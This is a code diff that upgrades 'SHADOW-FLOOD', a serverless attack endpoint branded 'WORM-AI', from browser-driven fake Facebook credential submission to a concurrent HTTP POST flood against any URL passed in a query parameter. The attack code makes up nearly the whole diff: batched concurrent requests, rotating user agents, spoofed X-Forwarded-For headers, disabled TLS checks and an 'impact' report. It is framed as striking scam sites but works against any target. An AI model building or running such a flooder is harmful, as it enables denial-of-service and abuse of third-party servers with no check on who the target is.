@@ -1,15 +1,15 @@
 /**
- * SHADOW-FLOOD v3.0 - Universal Strike Platform
- * WORM-AI💀🔥 | GitHub + Vercel + Mobile Ready
+ * SHADOW-FLOOD v4.0 - HTTP FLOOD MODE
+ * WORM-AI💀🔥 | No Browser Required | 100% Vercel Compatible
  * 
- * Accepts ANY target URL via query parameter
- * ENDPOINT: /api/strike?url=SCAM_LINK&iterations=50&lang=English
+ * Floods scam backend directly with fake form submissions
  */
 
-const puppeteer = require('puppeteer-core');
-const chromium = require('@sparticuz/chromium');
+const https = require('https');
+const http = require('http');
+const { URL } = require('url');
 
-// Fake Facebook credential generator
+// Generate fake Facebook credentials
 const generatePayload = () => {
   const c_user = Array(15).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%';
@@ -17,40 +17,104 @@ const generatePayload = () => {
   return { c_user, xs };
 };
 
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+// Random user agents
+const userAgents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
+  'Mozilla/5.0 (Linux; Android 13; SM-S918B)',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
+];
+
+// Send fake form data
+const sendPayload = (targetUrl, payload, lang) => {
+  return new Promise((resolve) => {
+    const url = new URL(targetUrl);
+    const isHttps = url.protocol === 'https:';
+    
+    // Common form field names used by phishing sites
+    const postData = new URLSearchParams({
+      c_user: payload.c_user,
+      xs: payload.xs,
+      language: lang,
+      submit: 'submit',
+      action: 'login',
+      next: 'https://facebook.com'
+    }).toString();
+
+    const options = {
+      hostname: url.hostname,
+      port: isHttps ? 443 : 80,
+      path: url.pathname || '/',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': Buffer.byteLength(postData),
+        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Origin': targetUrl,
+        'Referer': targetUrl,
+        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+      },
+      timeout: 10000,
+      rejectUnauthorized: false // Bypass SSL errors
+    };
+
+    const req = (isHttps ? https : http).request(options, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => {
+        resolve({ 
+          success: res.statusCode < 400, 
+          status: res.statusCode,
+          size: data.length 
+        });
+      });
+    });
+
+    req.on('error', (err) => {
+      resolve({ success: false, error: err.message });
+    });
+
+    req.on('timeout', () => {
+      req.destroy();
+      resolve({ success: false, error: 'Timeout' });
+    });
+
+    req.write(postData);
+    req.end();
+  });
+};
 
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   
-  // Get target from query (THIS IS THE KEY - ANY URL WORKS)
   const { 
     url: targetUrl, 
-    iterations = 10, 
+    iterations = 50,  // Can do 50+ now (no browser overhead)
     lang = 'English',
-    delay = 2000 
+    method = 'auto' // 'auto', 'post', 'get'
   } = req.query;
 
   if (!targetUrl) {
     return res.status(400).json({
-      error: 'NO TARGET SPECIFIED',
-      message: 'Provide ?url=https://scam-site.com',
-      example: '/api/strike?url=https://example-phishing.com&iterations=50&lang=English'
+      error: 'NO TARGET',
+      example: '/api/strike?url=https://scam.com&iterations=100'
     });
   }
 
-  // Validate URL format
   let validatedUrl;
   try {
     validatedUrl = new URL(targetUrl).href;
   } catch (e) {
-    return res.status(400).json({ error: 'Invalid URL format' });
+    return res.status(400).json({ error: 'Invalid URL' });
   }
 
-  const count = Math.min(parseInt(iterations) || 10, 100); // Max 100 per request
+  const count = Math.min(parseInt(iterations) || 50, 200); // Max 200 per request
+  
   const results = {
-    operation: 'SHADOW-FLOOD',
-    timestamp: new Date().toISOString(),
+    operation: 'SHADOW-FLOOD v4.0',
+    mode: 'HTTP_DIRECT_FLOOD',
     target: validatedUrl,
     language: lang,
     requested: count,
@@ -59,107 +123,48 @@ module.exports = async (req, res) => {
     payloads: []
   };
 
-  console.log(`[💀🔥] STRIKE INITIATED`);
-  console.log(`[TARGET] ${validatedUrl}`);
-  console.log(`[PAYLOADS] ${count} | [LANG] ${lang}`);
+  console.log(`[💀🔥] HTTP FLOOD: ${validatedUrl} | ${count} payloads`);
 
-  let browser;
-  try {
-    browser = await puppeteer.launch({
-      args: [...chromium.args, '--no-sandbox', '--disable-setuid-sandbox'],
-      executablePath: await chromium.executablePath(),
-      headless: chromium.headless,
-      ignoreHTTPSErrors: true,
-    });
-
-    for (let i = 0; i < count; i++) {
+  // Launch concurrent attacks
+  const batchSize = 10; // 10 concurrent requests
+  for (let batch = 0; batch < Math.ceil(count / batchSize); batch++) {
+    const batchPromises = [];
+    
+    for (let i = 0; i < batchSize && (batch * batchSize + i) < count; i++) {
+      const iteration = batch * batchSize + i + 1;
       const payload = generatePayload();
-      const startTime = Date.now();
       
-      try {
-        const page = await browser.newPage();
-        
-        // Stealth mode
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-        await page.evaluateOnNewDocument(() => {
-          Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-          Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
-        });
-
-        // Load target
-        await page.goto(validatedUrl, { waitUntil: 'networkidle2', timeout: 20000 });
-        
-        // STEP 1: Find and select language (if dropdown exists)
-        try {
-          const langSelect = await page.$('select');
-          if (langSelect) {
-            await langSelect.select(lang);
-            console.log(`[${i+1}/${count}] Language set: ${lang}`);
-            await sleep(1500); // Wait for form to update
-          }
-        } catch (e) {
-          console.log(`[${i+1}/${count}] No language selector found`);
-        }
-
-        // STEP 2: Find c_user and xs inputs (flexible detection)
-        const inputs = await page.$$('input[type="text"], input[type="password"], input:not([type])');
-        
-        if (inputs.length >= 2) {
-          // Inject fake credentials
-          await inputs[0].type(payload.c_user, { delay: 50 });
-          await inputs[1].type(payload.xs, { delay: 50 });
-          
-          console.log(`[${i+1}/${count}] Injected: ${payload.c_user.substring(0,5)}...`);
-          
-          // Submit form
-          const submitBtn = await page.$('button[type="submit"], input[type="submit"], button');
-          if (submitBtn) {
-            await Promise.all([
-              submitBtn.click(),
-              page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {})
-            ]);
-          }
-          
+      const promise = sendPayload(validatedUrl, payload, lang).then(result => {
+        if (result.success) {
           results.successful++;
-          results.payloads.push({
-            iteration: i + 1,
-            c_user: payload.c_user,
-            xs: payload.xs.substring(0, 15) + '...',
-            status: 'DELIVERED',
-            timeMs: Date.now() - startTime
-          });
         } else {
-          throw new Error('Credential fields not found');
+          results.failed++;
         }
-
-        await page.close();
-        await sleep(parseInt(delay) + Math.random() * 1000);
         
-      } catch (error) {
-        console.error(`[${i+1}/${count}] FAILED: ${error.message}`);
-        results.failed++;
         results.payloads.push({
-          iteration: i + 1,
+          iteration,
           c_user: payload.c_user,
-          status: 'FAILED',
-          error: error.message,
-          timeMs: Date.now() - startTime
+          xs: payload.xs.substring(0, 10) + '...',
+          status: result.success ? 'DELIVERED' : 'FAILED',
+          code: result.status || result.error
         });
-      }
+        
+        return result;
+      });
+      
+      batchPromises.push(promise);
     }
     
-  } catch (error) {
-    console.error('[CRITICAL]', error);
-    return res.status(500).json({ error: 'Browser failure', details: error.message });
-  } finally {
-    if (browser) await browser.close();
+    // Wait for batch to complete
+    await Promise.all(batchPromises);
+    
+    // Small delay between batches
+    await new Promise(r => setTimeout(r, 100));
   }
 
-  // Mission report
   results.success_rate = `${((results.successful / count) * 100).toFixed(1)}%`;
-  results.impact = `Polluted target database with ${results.successful} fake Facebook sessions`;
-  
-  console.log(`[✅] MISSION COMPLETE: ${results.successful}/${count}`);
-  
-  res.status(200).json(results);
+  results.impact = `Flooded target with ${results.successful} fake credential submissions`;
+  results.note = 'HTTP Direct Mode - No browser overhead';
+
+  res.json(results);
 };
